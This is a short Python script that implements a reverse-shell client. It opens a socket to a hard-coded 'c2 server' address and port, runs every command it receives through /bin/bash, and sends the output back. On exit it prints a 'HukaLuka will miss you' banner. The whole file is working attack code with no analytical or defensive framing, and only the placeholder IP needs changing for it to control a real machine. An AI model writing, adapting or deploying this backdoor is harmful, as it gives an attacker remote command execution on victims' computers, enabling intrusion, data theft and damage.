#!/usr/bin/python3

import os
import socket
import subprocess


# create socket
def socket_create():
    try:
        global host
        global port
        global s
        host = '127.0.0.1' # c2 server ip
        port = 5555 # random port number
        s = socket.socket()
    except socket.error as msg:
        print("socket creation error: " + str(msg))


# connect to a remote socket
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print("socket connection error: " + str(msg))


# receive commands and run them
# receive commands from remote server and run on local machine
def receive_commands():
    global s
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, executable='/bin/bash')
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
            #print(output_str)
    s.close()


def main():
    socket_create()
    socket_connect()
    receive_commands()


if __name__ == "__main__":
   try:
      main()
   except KeyboardInterrupt:
      # do nothing here
      #pass
      print(''
'\n\n******************************************************************'
'\n*                      __          __              __            *'
'\n*        /\  /\       / /         / /             / /            *'
'\n*       / /_/ /_   _ / /__ __    / /       _   _ / /__ __        *'
'\n*      / __  / /__/ /    / - \  / /_____ / /__/ /    / - \       *'
'\n*      \/ /_/______/__/\_\_/\_\/________/______/__/\_\_/\_\      *'
'\n*                                                                *'
'\n*                   HukaLuka will miss you :)                    *'
'\n*                                                                *'
'\n******************************************************************\n')
